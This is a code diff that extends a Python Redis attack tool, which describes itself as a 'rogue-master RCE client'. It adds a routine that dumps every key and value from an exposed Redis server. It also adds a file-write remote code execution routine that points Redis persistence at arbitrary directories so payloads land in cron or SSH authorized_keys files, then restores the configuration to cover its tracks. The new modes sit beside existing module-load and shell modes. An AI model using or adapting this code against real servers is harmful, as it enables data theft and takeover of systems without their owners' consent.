@@ -226,6 +226,99 @@ def check_target(host, port):
         print(f"[-] Could not connect to Redis at {host}:{port}: {e}")
     return False
 
+def _read_resp(sock):
+    """Full RESP response parser (handles +, -, :, $, * types)."""
+    line = _recv_line(sock)
+    if not line:
+        return None
+    t, rest = chr(line[0]), line[1:].decode(errors="replace")
+    if t == "+":
+        return rest
+    if t == "-":
+        raise RuntimeError(rest)
+    if t == ":":
+        return int(rest)
+    if t == "$":
+        n = int(rest)
+        if n == -1:
+            return None
+        data = _recv_bulk(sock, n)
+        sock.recv(2)  # trailing CRLF
+        return data.decode(errors="replace")
+    if t == "*":
+        n = int(rest)
+        return None if n == -1 else [_read_resp(sock) for _ in range(n)]
+    return line.decode(errors="replace")
+
+
+def _redis_cmd(host, port, *args):
+    """One-shot command: connect, send, read one response, close."""
+    s = socket.create_connection((host, port), timeout=10)
+    s.sendall(_resp_encode(list(args)))
+    result = _read_resp(s)
+    s.close()
+    return result
+
+
+def dump_keys(host, port):
+    """Enumerate all keys and print their values."""
+    s = socket.create_connection((host, port), timeout=10)
+    s.sendall(_resp_encode(["KEYS", "*"]))
+    keys = _read_resp(s)
+    s.close()
+    if not keys:
+        print("[*] No keys found.")
+        return
+    print(f"[+] Found {len(keys)} key(s):\n")
+    for k in keys:
+        try:
+            t = _redis_cmd(host, port, "TYPE", k)
+            if t == "string":
+                v = _redis_cmd(host, port, "GET", k)
+            elif t == "list":
+                v = _redis_cmd(host, port, "LRANGE", k, 0, -1)
+            elif t == "set":
+                v = _redis_cmd(host, port, "SMEMBERS", k)
+            elif t == "hash":
+                v = _redis_cmd(host, port, "HGETALL", k)
+            else:
+                v = f"<{t}>"
+            print(f"  [{t}] {k!r}: {v!r}")
+        except Exception as e:
+            print(f"  {k!r}: <error: {e}>")
+
+
+def write_file(host, port, directory, filename, content):
+    """
+    File-write RCE via CONFIG SET + BGSAVE.
+    The RDB dump wraps the payload in binary headers; cron and SSH
+    authorized_keys parsers ignore the surrounding bytes.
+    """
+    rc = socket.create_connection((host, port), timeout=10)
+
+    def cmd(*args):
+        rc.sendall(_resp_encode(list(args)))
+        return _read_resp(rc)
+
+    orig_dir = cmd("CONFIG", "GET", "dir")[1]
+    orig_dbf = cmd("CONFIG", "GET", "dbfilename")[1]
+
+    print(f"[*] Redirecting persistence -> {directory}/{filename}")
+    cmd("CONFIG", "SET", "dir", directory)
+    cmd("CONFIG", "SET", "dbfilename", filename)
+    cmd("SET", "_rce_payload", content)
+    cmd("BGSAVE")
+    time.sleep(1)
+    print(f"[+] BGSAVE issued - file at {directory}/{filename}")
+    print(f"[*] Embedded payload: {content!r}")
+
+    cmd("CONFIG", "SET", "dir", orig_dir)
+    cmd("CONFIG", "SET", "dbfilename", orig_dbf)
+    cmd("DEL", "_rce_payload")
+    rc.close()
+    print(f"[*] Config restored -> {orig_dir}/{orig_dbf}")
+
+
 def perform_exploit(args):
     target = args.target
     port = args.port
@@ -292,8 +385,24 @@ def main():
     parser = argparse.ArgumentParser(description="Redis rogue‑master RCE client")
     parser.add_argument("target", help="Target Redis host (IP or hostname)")
     parser.add_argument("--port", type=int, default=6379, help="Target Redis port (default: 6379)")
-    parser.add_argument("--mode", choices=["check", "exploit", "shell"], default="check",
-                        help="Operation mode (default: check)")
+    parser.add_argument(
+        "--mode",
+        choices=["check", "keys", "write", "exploit", "shell"],
+        default="check",
+        help=(
+            "check   - verify unauth access | "
+            "keys    - enumerate all keys | "
+            "write   - file-write RCE via BGSAVE | "
+            "exploit - rogue-master module-load RCE | "
+            "shell   - system.exec shell (post-exploit)"
+        ),
+    )
+    parser.add_argument("--dir",      default="/tmp",
+                        help="Target directory for write mode (default: /tmp)")
+    parser.add_argument("--filename", default="redis_test.txt",
+                        help="Target filename for write mode")
+    parser.add_argument("--content",  default="\n\n# redis rce test\n\n",
+                        help="Payload content for write mode")
     parser.add_argument("--module", default="exp.so",
                         help="Path to the compiled malicious module (default: exp.so in cwd)")
     parser.add_argument("--command", default="id",
@@ -305,6 +414,12 @@ def main():
 
     if args.mode == "check":
         check_target(args.target, args.port)
+    elif args.mode == "keys":
+        dump_keys(args.target, args.port)
+    elif args.mode == "write":
+        print(f"\n[*] File-write RCE: {args.dir}/{args.filename}")
+        print("[*] RDB headers wrap the payload; cron/authorized_keys tolerate them.")
+        write_file(args.target, args.port, args.dir, args.filename, args.content)
     elif args.mode == "exploit":
         perform_exploit(args)
     elif args.mode == "shell":
